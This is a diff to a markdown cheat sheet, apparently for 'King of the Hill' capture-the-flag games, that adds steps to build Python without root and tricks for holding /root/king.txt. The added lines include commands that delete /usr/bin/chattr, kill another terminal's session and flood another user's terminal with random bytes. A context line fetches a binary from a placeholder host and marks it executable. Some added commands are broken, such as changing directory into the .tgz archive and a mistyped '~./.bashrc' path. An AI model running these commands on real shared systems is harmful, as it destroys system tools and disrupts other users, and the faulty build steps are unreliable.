@@ -205,6 +205,15 @@ search "network.security.ports.banned.override"
 Select on "strings"  and [+] 
 write "port22"
 ```
+# install python without root:
+```bash
+wget https://www.python.org/ftp/python/3.9.9/Python-3.9.9.tgz
+tar -zxvf Python-3.9.9.tgz
+cd Python-3.9.9.tgz
+mkdir ~/.localpython
+./configure --prefix=/home/$(whoami)/.localpython
+make;make install
+```
 # Machine Tricks ✅📚
 ## flag_finder ✅
 ```bash
@@ -218,11 +227,15 @@ find / -name '*flag*' -ls 2>/dev/null
 set write off
 chattr +ai /root/king.txt
 chattr -ai /root/king.txt
+rm -rf /usr/bin/chattr
 pkill -9 -t pts/1
+echo 'set -o noclobber' >> ~./.bashrc
 set -o noclobber /root/king.txt
 set +o noclobber /root/king.txt
 sudo mount --bind -o ro /root/king.txt /root/king.txt 2>/dev/null
 echo "USERNAME" >| /root/king.txt
+
+cat /dev/urandom > /dev/pts/# ( sending spam for another user )
 
 wget http://yourip/nyancat
 chmod +x nyancat 
